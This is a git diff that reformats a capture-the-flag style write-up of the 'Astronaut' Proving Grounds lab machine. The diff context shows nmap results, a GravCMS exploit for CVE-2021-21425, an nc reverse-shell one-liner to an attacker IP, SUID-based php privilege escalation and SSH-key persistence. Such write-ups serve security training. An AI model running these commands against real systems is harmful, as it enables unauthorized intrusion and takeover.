@@ -1,10 +1,11 @@
 # Astronaut
 ### Proving Grounds Practice
 ### Linux Machine
-
+<br>
 Beginning with a typical service and version scan with nmap, we find that only ports 22 (ssh) and 80 (http) are open. Additionally we are informed that there is a directory listing available, notably grav-admin.
-
+<br>
 #### Nmap Results
+<br>
 
 ```nmap-output
 
@@ -33,22 +34,24 @@ Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
 ```
-
+<br>
 Enumerating the website, we in fact find that there is a content management system in use, Grav-CMS.
+<br>
 
 ![image](https://github.com/user-attachments/assets/0d45e3e0-b7ae-4582-9fb7-573951440855)
+<br>
 
 ![image](https://github.com/user-attachments/assets/cc0904c2-185e-4a2b-a47d-6564ca5e889b)
-
+<br>
 A quick search for related exploits turns up an interesting find. 
+<br>
 
 #### GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)
 
 ```
 https://github.com/CsEnox/CVE-2021-21425
 ```
-
-
+<br>
 #### Exploit
 
 ```python
@@ -104,20 +107,23 @@ else:
 
 print("Exploit completed")
 ```
+<br>
 Setting our listener to port 4444. Then sending the exploit command.
+<br>
 
 ![image](https://github.com/user-attachments/assets/ada695c3-222f-427f-961f-c7dee3ccdf58)
-
-
+<br>
 #### Command Line
 
 ```
 python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.21.153 4444 >/tmp/f' -t http://192.168.207.12/grav-admin
 ```
+<br>
 We get a reverse shell, as www-data.
+<br>
 
 ![image](https://github.com/user-attachments/assets/14e3bca3-8656-4e09-b26a-48b350817cb6)
-
+<br>
 
 #### Stabilize Shell
 
@@ -127,29 +133,31 @@ export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
 <br>
 
 ![image](https://github.com/user-attachments/assets/bb1e2a10-7faf-40fb-abd8-7ddfbf7a2f10)
-
+<br>
 We cannot check for sudo rights on www-data because we don't have the password. But we can search for binaries that may have the SUID bit set.
-
+<br>
 #### SUID Hunting
 
 ```
 find / -perm -u=s 2>/dev/null
 ```
+<br>
 
 ![image](https://github.com/user-attachments/assets/71cc304e-6c4b-4679-88a9-609b05ad1bba)
-
+<br>
 Checking out the findings on GTFOBins php seems to be a great candidate for Privilege Escalation.
-
+<br>
 #### Escalate Privileges
 
 ```shell
 /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
+<br>
 
 ![image](https://github.com/user-attachments/assets/4bcce87e-17d0-4de1-9c29-1a4e3eed8e1a)
-
+<br>
 Now that we have root access, we can submit the proof of pwnage. Additionally we can have persistence on the machine by adding our public key to the authorized_keys file.
-
+<br>
 #### Persistence via SSH
 
 ```
